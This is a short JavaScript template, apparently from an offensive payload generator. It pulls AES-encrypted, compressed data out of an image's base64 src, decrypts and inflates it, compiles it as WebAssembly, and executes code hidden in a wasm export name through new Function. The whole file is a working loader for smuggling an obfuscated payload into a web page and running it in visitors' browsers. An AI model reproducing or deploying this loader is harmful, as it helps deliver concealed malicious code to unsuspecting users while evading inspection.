function runNimWasm(w){for(i of WebAssembly.Module.exports(w)){n=i.name;if(n[0]==';'){new Function('m',n)(w);break}}}

function myFunction() {
    async function decryptMessage(ciphertext, keyB64, ivB64) {
        const keyBytes = base64ToArrayBuffer(keyB64);
        const ivBytes = base64ToArrayBuffer(ivB64);

        const cryptoKey = await crypto.subtle.importKey(
            "raw",
            keyBytes,
            { name: "AES-CTR" },
            false,
            ["decrypt"]
        );

        const decrypted = await crypto.subtle.decrypt(
            { name: "AES-CTR", counter: new Uint8Array(ivBytes), length: 64 },
            cryptoKey, 
            ciphertext
        );

        return decrypted;
    }

    function base64ToArrayBuffer(b64) {
        const binary = atob(b64);
        const len = binary.length;
        const bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary.charCodeAt(i);
        }
        return bytes.buffer;
    }
    async function process() {
        const b64Data = document.getElementById("myImg").src.split('base64,')[1];
        const encryptedBuffer = base64ToArrayBuffer(b64Data);
        const decryptedBuffer = await decryptMessage(encryptedBuffer, "{{b64(o.aesKey)}}", "{{b64(o.aesIV)}}");
        const ds = new DecompressionStream("deflate-raw");
        const decompressedStream = new Blob([decryptedBuffer]).stream().pipeThrough(ds);
        const plainBuffer = await new Response(decompressedStream).arrayBuffer();
        WebAssembly.compile(plainBuffer).then(runNimWasm);
    }
    process();
}
